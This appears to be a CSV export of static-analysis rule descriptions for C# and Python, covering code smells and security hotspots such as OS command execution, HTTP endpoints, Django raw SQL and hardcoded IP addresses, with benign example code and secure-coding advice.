<h2>Compliant Solution</h2>
<pre>
if (booleanMethod()) { /* ... */ }
if (!booleanMethod()) { /* ... */ }
if (booleanMethod()) { /* ... */ }
doSomething(true);
doSomething(booleanMethod());

booleanVariable = booleanMethod();
booleanVariable = booleanMethod() || exp;
booleanVariable = !booleanMethod() &amp;&amp; exp;
booleanVariable = !booleanMethod() || exp;
booleanVariable = booleanMethod() &amp;&amp; exp;

for (var x = 0; ; x++)
{
 ...
}
</pre>",csharpsquid:S1125,cs,C#,"<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (booleanMethod() == true) { /* ... */ }
if (booleanMethod() == false) { /* ... */ }
if (booleanMethod() || false) { /* ... */ }
doSomething(!false);
doSomething(booleanMethod() == true);

booleanVariable = booleanMethod() ? true : false;
booleanVariable = booleanMethod() ? true : exp;
booleanVariable = booleanMethod() ? false : exp;
booleanVariable = booleanMethod() ? exp : true;
booleanVariable = booleanMethod() ? exp : false;

for (var x = 0; true; x++)
{
 ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (booleanMethod()) { /* ... */ }
if (!booleanMethod()) { /* ... */ }
if (booleanMethod()) { /* ... */ }
doSomething(true);
doSomething(booleanMethod());

booleanVariable = booleanMethod();
booleanVariable = booleanMethod() || exp;
booleanVariable = !booleanMethod() &amp;&amp; exp;
booleanVariable = !booleanMethod() || exp;
booleanVariable = booleanMethod() &amp;&amp; exp;

for (var x = 0; ; x++)
{
 ...
}
</pre>",Boolean literals should not be redundant,[],MINOR,['clumsy'],CODE_SMELL
2017-12-20T09:38:25+0100,"<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test
+{
+}
\ No newline at end of file
</pre>",csharpsquid:S113,cs,C#,"<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test
+{
+}
\ No newline at end of file
</pre>",Files should contain an empty newline at the end,[],MINOR,['convention'],CODE_SMELL
2015-12-08T17:00:00+0100,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private int Divide(int numerator, int denominator)
{
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",csharpsquid:S1134,cs,C#,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private int Divide(int numerator, int denominator)
{
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""FIXME"" tags",[],MAJOR,['cwe'],CODE_SMELL
2015-12-08T17:00:00+0100,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void DoSomething()
{
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",csharpsquid:S1135,cs,C#,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void DoSomething()
{
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""TODO"" tags",[],INFO,['cwe'],CODE_SMELL
2019-03-14T10:00:54+0100,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Python 3</p>
<pre>
import subprocess
import os

params = [""ls"", ""-l""]

subprocess.run(params)  # Questionable
subprocess.Popen(params)  # Questionable

# Older API

subprocess.call(params)  # Questionable
subprocess.check_call(params)  # Questionable
subprocess.check_output(params)  # Questionable

cmd = ""ls -l""
os.system(cmd)  # Questionable

mode = os.P_WAIT
file = ""ls""
path = ""/bin/ls""
env = os.environ
os.spawnl(mode, path, *params)  # Questionable
os.spawnle(mode, path, *params, env)  # Questionable
os.spawnlp(mode, file, *params)  # Questionable
os.spawnlpe(mode, file, *params, env)  # Questionable
os.spawnv(mode, path, params)  # Questionable
os.spawnve(mode, path, params, env)  # Questionable
os.spawnvp(mode, file, params)  # Questionable
os.spawnvpe(mode, file, params, env)  # Questionable

mode = 'r'
(child_stdout) = os.popen(cmd, mode, 1)  # Questionable
# print(child_stdout.read())

(_, output) = subprocess.getstatusoutput(cmd)  # Questionable

out = subprocess.getoutput(cmd)  # Questionable

os.startfile(path)  # Questionable

os.execl(path, *params)  # Questionable
os.execle(path, *params, env)  # Questionable
os.execlp(file, *params)  # Questionable
os.execlpe(file, *params, env)  # Questionable
os.execv(path, params)  # Questionable
os.execve(path, params, env)  # Questionable
os.execvp(file, params)  # Questionable
os.execvpe(file, params, env)  # Questionable
</pre>
<p>Python 2</p>
<pre>
import os
import popen2

cmd = ""ls -l""
mode = ""r""
(_, child_stdout) = os.popen2(cmd, mode)  # Questionable
(_, child_stdout, _) = os.popen3(cmd, mode)  # Questionable
(_, child_stdout) = os.popen4(cmd, mode)  # Questionable

(child_stdout, _) = popen2.popen2(cmd)  # Questionable
(child_stdout, _, _) = popen2.popen3(cmd)  # Questionable
(child_stdout, _) = popen2.popen4(cmd)  # Questionable
</pre>",python:S4721,py,Python,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Python 3</p>
<pre>
import subprocess
import os

params = [""ls"", ""-l""]

subprocess.run(params)  # Questionable
subprocess.Popen(params)  # Questionable

# Older API

subprocess.call(params)  # Questionable
subprocess.check_call(params)  # Questionable
subprocess.check_output(params)  # Questionable

cmd = ""ls -l""
os.system(cmd)  # Questionable

mode = os.P_WAIT
file = ""ls""
path = ""/bin/ls""
env = os.environ
os.spawnl(mode, path, *params)  # Questionable
os.spawnle(mode, path, *params, env)  # Questionable
os.spawnlp(mode, file, *params)  # Questionable
os.spawnlpe(mode, file, *params, env)  # Questionable
os.spawnv(mode, path, params)  # Questionable
os.spawnve(mode, path, params, env)  # Questionable
os.spawnvp(mode, file, params)  # Questionable
os.spawnvpe(mode, file, params, env)  # Questionable

mode = 'r'
(child_stdout) = os.popen(cmd, mode, 1)  # Questionable
# print(child_stdout.read())

(_, output) = subprocess.getstatusoutput(cmd)  # Questionable

out = subprocess.getoutput(cmd)  # Questionable

os.startfile(path)  # Questionable

os.execl(path, *params)  # Questionable
os.execle(path, *params, env)  # Questionable
os.execlp(file, *params)  # Questionable
os.execlpe(file, *params, env)  # Questionable
os.execv(path, params)  # Questionable
os.execve(path, params, env)  # Questionable
os.execvp(file, params)  # Questionable
os.execvpe(file, params, env)  # Questionable
</pre>
<p>Python 2</p>
<pre>
import os
import popen2

cmd = ""ls -l""
mode = ""r""
(_, child_stdout) = os.popen2(cmd, mode)  # Questionable
(_, child_stdout, _) = os.popen3(cmd, mode)  # Questionable
(_, child_stdout) = os.popen4(cmd, mode)  # Questionable

(child_stdout, _) = popen2.popen2(cmd)  # Questionable
(child_stdout, _, _) = popen2.popen3(cmd)  # Questionable
(child_stdout, _) = popen2.popen4(cmd)  # Questionable
</pre>",Executing OS commands is security-sensitive,[],CRITICAL,"['cwe', 'sans-top25-insecure']",SECURITY_HOTSPOT
2015-04-07T09:32:26+0200,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def divide(numerator, denominator):
  return numerator / denominator              # FIXME denominator value might be 0
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",python:S1134,py,Python,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def divide(numerator, denominator):
  return numerator / denominator              # FIXME denominator value might be 0
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""FIXME"" tags",[],MAJOR,['cwe'],CODE_SMELL
2019-03-14T10:00:54+0100,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint. It guides security code reviews to security-sensitive code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Django endpoint declaration</p>
<pre>
from django.urls import path, re_path

def declare_views(views):
    return [
        path('', views['index']),  # Questionable
        re_path(r'^about/[0-9]*/$', views['about']),  # Questionable
    ]
</pre>",python:S4529,py,Python,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint. It guides security code reviews to security-sensitive code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Django endpoint declaration</p>
<pre>
from django.urls import path, re_path

def declare_views(views):
    return [
        path('', views['index']),  # Questionable
        re_path(r'^about/[0-9]*/$', views['about']),  # Questionable
    ]
</pre>",Exposing HTTP endpoints is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'owasp-a7', 'sans-top25-insecure', 'sans-top25-porous', 'sans-top25-risky', 'spring']",SECURITY_HOTSPOT
2019-03-14T10:00:54+0100,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should sanitize any externally-provided values used in those commands. Failure to do so could allow an attacker to include input
that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL binding
mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule flags the execution of SQL queries via Django methods which are not recommended by Django documentation as their use can result in an SQL
injection. The goal is to guide security code reviews.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
  <li> Follow <a href=""https://docs.djangoproject.com/en/2.1/topics/security/#sql-injection-protection"">Django best practices</a>. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Questionable Code Example</h2>
<pre>
from django.db import models
from django.db import connection
from django.db import connections
from django.db.models.expressions import RawSQL

value = input()


class MyUser(models.Model):
    name = models.CharField(max_length=200)


def query_my_user(request, params):
    MyUser.objects.raw(request)  # Questionable

    # Parametrized queries
    MyUser.objects.raw(request, params)  # Questionable.

    with connection.cursor() as cursor:
        cursor.execute(request)  # Questionable

    with connections['my_db'].cursor() as cursor:
        cursor.execute(request)  # Questionable

    # https://docs.djangoproject.com/en/2.1/ref/models/expressions/#raw-sql-expressions

    RawSQL(""select col from mytable where mycol = %s"", (""test"",))  # Questionable, See ""Note""

    # https://docs.djangoproject.com/en/2.1/ref/models/querysets/#extra

    MyUser.objects.extra(  # Questionable. calling the ""extra"" method, See ""Note""
        select={
            'mycol': 'myothercol &gt; 10'
        },
    )
</pre>",python:S2077,py,Python,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should sanitize any externally-provided values used in those commands. Failure to do so could allow an attacker to include input
that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL binding
mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule flags the execution of SQL queries via Django methods which are not recommended by Django documentation as their use can result in an SQL
injection. The goal is to guide security code reviews.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
  <li> Follow <a href=""https://docs.djangoproject.com/en/2.1/topics/security/#sql-injection-protection"">Django best practices</a>. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Questionable Code Example</h2>
<pre>
from django.db import models
from django.db import connection
from django.db import connections
from django.db.models.expressions import RawSQL

value = input()


class MyUser(models.Model):
    name = models.CharField(max_length=200)


def query_my_user(request, params):
    MyUser.objects.raw(request)  # Questionable

    # Parametrized queries
    MyUser.objects.raw(request, params)  # Questionable.

    with connection.cursor() as cursor:
        cursor.execute(request)  # Questionable

    with connections['my_db'].cursor() as cursor:
        cursor.execute(request)  # Questionable

    # https://docs.djangoproject.com/en/2.1/ref/models/expressions/#raw-sql-expressions

    RawSQL(""select col from mytable where mycol = %s"", (""test"",))  # Questionable, See ""Note""

    # https://docs.djangoproject.com/en/2.1/ref/models/querysets/#extra

    MyUser.objects.extra(  # Questionable. calling the ""extra"" method, See ""Note""
        select={
            'mycol': 'myothercol &gt; 10'
        },
    )
</pre>",Executing SQL queries is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1', 'sans-top25-insecure', 'sql']",SECURITY_HOTSPOT
2015-04-07T09:32:26+0200,"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901"">CVE-2006-5901</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725"">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
ip = '192.168.12.42'
sock = socket.socket()
sock.bind((ip, 9090))
</pre>
<h2>Compliant Solution</h2>
<pre>
ip = config.get(section, ipAddress)
sock = socket.socket()
sock.bind((ip, 9090))
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=""http://www.oid-info.com/introduction.htm"">often match
  Object Identifiers</a> (OID). </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",python:S1313,py,Python,"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901"">CVE-2006-5901</a> </li>
